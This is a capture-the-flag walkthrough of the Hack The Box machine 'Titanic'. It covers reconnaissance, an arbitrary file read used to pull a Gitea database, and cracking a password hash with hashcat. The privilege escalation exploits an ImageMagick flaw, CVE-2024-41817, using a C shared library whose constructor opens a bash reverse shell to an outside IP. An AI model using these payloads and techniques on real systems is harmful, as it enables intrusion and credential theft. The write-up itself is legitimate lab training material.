---
title: "Titanic - HTB"
date: "2025-07-11"
views: 0

---
![Pawned](/images/HTB/Pasted_image_20250715162059.png)

**Titanic** is an easy difficulty Linux machine that features a website where users can make travel reservations. This led me to intercept the reservation request, where I identified an **Arbitrary File Read** vulnerability that allowed me to access sensitive system files such as `/etc/passwd`.

However, the most critical part was found in a **hidden vHost** that I discovered through **vhost fuzzing**, which hosted a **Gitea** instance. By analyzing this service, I was able to download the server’s **SQLite database**, where I found **hashed credentials** that I was later able to **crack by brute force** using **hashcat**, which allowed me to gain initial access to the system via **SSH**.

Once inside (as an unprivileged user), I performed **enumeration tasks** and discovered a **script that ran every minute**, which used the **magick** tool (from _ImageMagick_). This tool was linked to a version vulnerable to **Arbitrary Code Execution (CVE-2024-41817)**. By leveraging a **malicious shared library payload** (`libxcb.so.1`), I was able to get `magick` to execute arbitrary code, allowing me to obtain a shell with elevated privileges and ultimately **escalate to root**.

-------

## Reconnaissance

Before starting with **active reconnaissance**, I create a directory structure to keep the files and results organized.
![Orden](/images/HTB/Pasted_image_20250713110541.png)
```zsh
mkdir -p Titanic/{scanning,exploits,data/credentials} 
tree
```

Then I perform a **ping** to the machine's IP to confirm that there is connectivity.
![Ping](/images/HTB/Pasted_image_20250713111011.png)
```zsh
ping -c 1 10.10.11.55
```
A *TTL* value of 63 suggests that the remote system is likely running Linux, as Linux systems typically use an initial TTL of 64. The observed value being one less indicates that the packet has passed through a single network hop (such as a router or intermediary device), which is common in virtualized environments or when connecting via VPN.

I perform a scan with *Nmap* to see which ports are open.
![nmap](/images/HTB/Pasted_image_20250715165400.png)
- `-p-`: scans the entire range of TCP ports (from 1 to 65535). 
- `–-open`: reports only the open ports, omitting the filtered or closed ones.
- `-sS`: Performs a stealthy SYN scan.
- `–-min-rate 5000`: Sets a minimum rate of 5000 packets per second, speeding up the scan.
- `-n`: To avoid DNS resolution. It prevents wasting time querying hostnames.
- `-Pn`: Skips the ping check. Assumes the host is up.
- `-oN`: Saves the scan output in normal format.

```zsh
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.55 -oN firstScan
```

I perform a more thorough scan on the open ports.
![nmap_puertos](/images/HTB/Pasted_image_20250713112934.png)
- `-p22,80`: specifies the ports to scan. 
- `-sC`: runs Nmap's default scripts.
- `-sV`: performs version detection on the discovered services.
- `-oN`: saves the results in a readable format.

```zsh
nmap -p22,80 -sCV 10.10.11.55 -oN targets
```

I see that the web server performs a redirection to a **domain name**, `titanic.htb`, which suggests that the server is using **Name-Based Virtual Hosting**. Therefore, I proceed to edit the `/etc/hosts` and associate this domain with the **victim machine's IP**.
![hosts](/images/HTB/Pasted_image_20250713113043.png)

Now, just out of curiosity, I perform the same scan again.
![curiosity](/images/HTB/Pasted_image_20250713113635.png)
Now *nmap* can properly resolve the domain thanks to the entry in the `/etc/hosts` file, allowing it to access the site, follow the redirect, and retrieve the page's HTML title.

I see what **technologies** are running in the background, but for now, nothing interesting.
![whatweb](/images/HTB/Pasted_image_20250713113657.png)

```zsh
whatweb http://10.10.11.55
```

I proceed to check the website.
![website](/images/HTB/Pasted_image_20250713113738.png)
I realize that the page is **static** because **hovering** over the different sections (home, about, services, contact) takes me within the same page.

However, when I click on "Book Now," the following window pops up.
![request](/images/HTB/Pasted_image_20250713113920.png)
What comes to mind is to intercept the request, so I open *Burp Suite*.

I fill in the required data and click on "Submit."
![fill](/images/HTB/Pasted_image_20250713114218.png)

![burpsuite1](/images/HTB/Pasted_image_20250713114631.png)
I see that the request is being processed via **POST**, which was to be expected. I also see the data I entered, nothing interesting, however, in the "Response" I notice something that does catch my attention, so I click on "Follow redirection."

![burpsuite2](/images/HTB/Pasted_image_20250713114750.png)
And I see that I’m given a “ticket” that takes me to view my data. So I start thinking about a possible **Arbitrary File Read** vulnerability, and I try to see if I can read sensitive files like `/etc/passwd`.

![burpsuite3](/images/HTB/Pasted_image_20250713115030.png)
Indeed, I can see the `/etc/passwd file`, so I’m facing an **Arbitrary File Read** vulnerability. However, since I can’t obtain more useful information from this vector, I proceed to perform **fuzzing** in search of hidden paths or vHosts that may expose new services.

While **fuzzing** for **subdomains**, I see that `dev.titanic.htb exists`.
![fuzzing](/images/HTB/Pasted_image_20250713115457.png)
- `vhost`: specifies that virtual host fuzzing mode will be used.
- `-u`: specifies the target URL.
- `-w`: specifies the subdomain wordlist to use.
- `--apend-domain`: automatically adds `.titanic.htb` at the end of each word in the wordlist.
- `-r`: performs the requests without following redirections.

```zsh
gobuster vhost -u http://titanic.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -r
```

I associate the new route with the victim machine's IP in my `/etc/hosts` and view its content.
![hosts](/images/HTB/Pasted_image_20250713115717.png)

![gitea](/images/HTB/Pasted_image_20250713115641.png)

I register to see if there are any interesting projects or something I could take advantage of.
![repositories](/images/HTB/Pasted_image_20250713115919.png)

I find two repositories from the user *developer*, who is indeed listed in the `/etc/passwd`.
![burpsuite4](/images/HTB/Pasted_image_20250713120301.png)

I proceed to analyze the repositories, and where I find interesting things is in the *docker-config*, so I bring it to my machine.
![clone](/images/HTB/Pasted_image_20250713121018.png)

## Exploitation

I see that the folder `/home/developer/gitea/data` is mounted as a volume in the **Gitea container**, so this looks promising since it could contain the Gitea installation directory, which usually holds valuable information. The file I'm looking for is the **database file**, which is usually named `gitea.db`. Now I need to figure out how to access it, if I try through Burp Suite, it doesn’t let me, so the file likely has a different name or there’s an extra or missing directory I’m overlooking due to my lack of knowledge of the **internal structure**. So what I could do is modify the file and run it to see the **internal structure** and eventually locate the `gitea.db` file.
![yml](/images/HTB/Pasted_image_20250713121504.png)

![volumes](/images/HTB/Pasted_image_20250713122045.png)

![up](/images/HTB/Pasted_image_20250713122528.png)

![up2](/images/HTB/Pasted_image_20250713122835.png)

When the **Gitea container** is started for the first time, since its configuration file (`app.ini`) does not exist, it enters installation mode. This activates its web configuration interface, which is accessible through **port 3000**.
![configuration](/images/HTB/Pasted_image_20250713123429.png)

![configuration2](/images/HTB/Pasted_image_20250713123454.png)

![loading](/images/HTB/Pasted_image_20250713123502.png)

## User Access

I go to `/tmp/data` (since this is the path I specified) to analyze what has been installed.
![looking](/images/HTB/Pasted_image_20250713123559.png)
And I see that the file I was looking for, `gitea.db`, is there. The reason I couldn’t see the `gitea.db` file through *Burp Suite* is because there are two `/gitea` directories, so if I try again now, I should be able to see it.

![burpsuite5](/images/HTB/Pasted_image_20250713123904.png)

The file is in SQLite format, so I'm going to bring it to my local machine, open it with `sqlite3`, and start exploring its contents.
![db](/images/HTB/Pasted_image_20250713124210.png)
- `-o`: indicates the name under which the downloaded file will be saved locally.

```zsh
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

I run a `.tables` command to display all the tables. The one I’m interested in is _user_.
![tables](/images/HTB/Pasted_image_20250713124250.png)

I select the table to view its content.
![content](/images/HTB/Pasted_image_20250713124440.png)
I can infer that these are the users' **hashed** passwords. The user _developer_ is the one I’m interested in, since I saw this one in the `/etc/passwd`.

I see that the hashing mode being used is PBKDF2-HMAC-SHA256 with 50,000 iterations, so I’ll be using mode 10900 with _hashcat_. What I need to do now is format the hash to make it compatible with the structure expected by hashcat. The expected format is: **sha256:50000:<salt_hex>:<hash_hex>** or **sha256:50000:<salt_base64>:<hash_base64>**. I’ll be using the second format (base64), because with this format, hashcat internally makes less effort and I’ll get the password faster.
![salt](/images/HTB/Pasted_image_20250713141808.png)
I have to mention that in order to find the salt, I had to investigate how **Gitea** internally handles **PBKDF2 hashes**. I found that it uses the following format to store the data:  `<hash_hex>|pbkdf2$<iterations>$|<auth_token>|<salt_hex>|`.  In this case, the hash and the **salt** are not in a single string, but are stored in separate fields.
There’s also usually a `passwd_salt` table in some older versions of Gitea, although in this case, that table doesn't exist. If the format you come across happens to vary, what I’d recommend is:
- Try using fields near the main hash (`passwd`).
- Check if there is a separate table storing the salt (`passwd_salt` or similar).
- Verify the size of the main hash, as in some implementations the salt is concatenated.

```zsh
echo "hash" | xxd -r -p | base64
```

![hash](/images/HTB/Pasted_image_20250713142907.png)

![bruteforce](/images/HTB/Pasted_image_20250710032231.png)
- `-m`: specifies the hash mode I want to crack.

```zsh
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Password cracked!
![cracked](/images/HTB/Pasted_image_20250713143359.png)

I connect via SSH.
![ssh](/images/HTB/Pasted_image_20250713144037.png)

## Privilege Escalation

While checking the `/opt` directory (a directory commonly used by administrators or developers, where interesting things are often found), I come across this script.
![script](/images/HTB/Pasted_image_20250713145044.png)
Inside the script, I identify a `magick identify` command, which is part of the ImageMagick software suite and is used to describe the format and characteristics of an image. Now, what I need to find out is how often this script is executed and which version of ImageMagick is installed.

I go to the directory where the script is executed.
![executed](/images/HTB/Pasted_image_20250713152523.png)
And I see that the `metadata.log` file is updated every minute, so it’s accurate to say that the script runs every minute. Remember that the script empties the content of the `metadata.log` file (`truncate -s 0`) and then fills it with the output of the `magick identify` command, applied to all `.jpg` files inside the specified directory.

I find out which version of ImageMagick is being used.
![research](/images/HTB/Pasted_image_20250713152741.png)
And I’m surprised to find that there’s a vulnerability in that version.

For privilege escalation, I have two exploitation vectors:

1. Exploiting **MAGICK_CONFIGURE_PATH** with **delegates.xml**.
2. Exploiting **LD_LIBRARY_PATH** with a **malicious shared library**.

But I will be using the **second vector** since it involves the *root* user executing the script. However, with the first vector, I have to execute the **delegates.xml** myself as the *developer* user; while this does demonstrate **Remote Command Execution**, it doesn’t grant me access as a privileged user.

The script does the following:

`find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log`

It’s not calling `delegates.xml` nor processing `.XML` files, which is exactly why the first vector isn’t useful here. I’ve also tried renaming the extension to `.jpg` (and other tricks) to see if it executes the XML code, but it doesn’t, so it must be sanitized somehow behind the scenes.

On the other hand, ImageMagick automatically loads certain shared libraries, such as `libxcb.so.1`, on startup, and if the environment has a misconfigured `LD_LIBRARY_PATH` (**empty path**), it will search the current directory first. So I’m going to create a malicious shared library.

I create the malicious library named `shell.c`.
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.16.5/443 0>&1'");
    exit(0);
}
```

I compile it.
```zsh
gcc -x c -shared -fPIC -o ./libxcb.so.1 shell.c
```
- `gcc`: calls the GNU compiler to compile C code.
- `-x c`: tells `gcc` that the file to compile is C code, even if it doesn't have a `.c` extension.
- `-shared`:indicates that I am compiling a shared library (`.so`, shared object), not an executable.
- `-fPIC`: generates Position Independent Code (PIC), which is required for shared libraries in Linux. This allows the library to be loaded at any memory address.
- `-o ./libxcb.so.1`: specifies the name of the output file, in this case a shared library that will masquerade as a legitimate system library.
- `shell.c`: the source file that contains the C code to be compiled.

I need it to be a shared library because the exploit relies on ImageMagick dynamically loading a library called `libxcb.so.1` at runtime. If you place your own malicious version in the same directory from which it's loaded, and it’s the first one found by `LD_LIBRARY_PATH`, then it will execute your `init()`.

I create the malicious library.
![library](/images/HTB/Pasted_image_20250718133814.png)

I compile the malicious library and, in a separate terminal, I start listening on port 443, which is where I’ll receive the reverse shell.
![compile](/images/HTB/Pasted_image_20250718133935.png)

After exactly one minute (when the script is executed), I get the shell as root.
![root](/images/HTB/Pasted_image_20250718134014.png)

![flag](/images/HTB/Pasted_image_20250718134111.png)
Chicharrón!
